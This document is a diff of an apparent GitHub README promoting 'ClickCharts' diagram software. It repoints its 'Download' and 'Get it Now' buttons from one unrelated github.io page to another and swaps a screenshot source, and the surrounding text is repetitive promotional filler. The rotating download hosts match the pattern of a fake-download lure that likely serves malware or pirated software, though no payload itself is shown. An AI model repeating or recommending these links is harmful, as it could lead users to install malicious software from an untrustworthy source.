@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gazan-programs.github.io/.github/clickCharts">
+  <a href="https://polycia-apps.github.io/.github/clickCharts">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download ClickCharts"/>
   </a>
 </p>
@@ -27,7 +27,7 @@ The <a href="#clickCharts">business process documentation use case</a> creates f
 The <a href="#clickCharts">organizational structure use case</a> builds org charts representing reporting hierarchies, team structures, and organizational relationships — the visual representation of organizational structure that HR, management, and communications contexts require. <a href="#clickCharts">Education and training use case</a> creates visual learning materials — concept maps, process diagrams, decision trees — that visual representation makes more comprehensible than text.
 
 <p align="center">
-  <img src="https://static.macupdate.com/screenshots/338794/m/clickcharts-screenshot.png?v=1660904567" alt="ClickCharts screenshot"/>
+  <img src="https://img.utdstc.com/screen/2c7/40e/2c740ee024c09ecc9ee3cbc815361f2f69d4ac32d0fe37f4fff1a5597d6259ba:600" alt="ClickCharts screenshot"/>
 </p>
 
 <a href="#clickCharts">Swimlane diagram support</a> creates cross-functional process diagrams where activities assign to lanes representing different roles, departments, or systems — the diagram format that makes responsibility assignment in complex processes visible at a glance. <a href="#clickCharts">Grid and alignment tools</a> snap shapes to a grid and align selected shapes to each other for clean, professional-looking diagrams without manual positioning effort.
@@ -81,7 +81,7 @@ Swimlane diagrams represent one of ClickCharts' most practically valuable diagra
 
 <p align="center">
 
-[![Get it Now ClickCharts](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/clickCharts)
+[![Get it Now ClickCharts](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/clickCharts)
 
 </p>
 
